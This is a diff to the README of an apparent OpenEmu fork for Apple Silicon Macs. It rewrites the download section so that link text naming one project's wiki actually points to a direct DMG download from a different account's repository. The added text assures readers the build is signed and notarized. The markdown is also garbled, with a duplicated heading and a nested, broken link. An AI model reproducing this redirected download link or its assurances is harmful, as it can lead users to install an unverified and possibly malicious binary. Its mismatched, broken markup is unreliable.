@@ -18,10 +18,11 @@
 
 This is a community-maintained fork of OpenEmu for M-series Macs. The app runs on 26.0+ (Tahoe) and has been tested on macOS 27 (Golden Gate).
 
-Download: Get the latest signed DMG from the Releases page. The app is notarized — no Gatekeeper workaround needed.
+### Download
+
+Get the latest signed DMG from the [Releases page]([https://github.com/nickybmon/OpenEmu-Silicon/wiki/Supported-Systems](https://github.com/Anhani1206/OpenEmuARM/releases/download/v2.1.0/OpenEmuARM.dmg)). The app is notarized — no Gatekeeper workaround needed.
 Download
 
-Get the latest build from the Releases page.
 
 ### Recent Updates OpenEmuARM 2.0.1
 
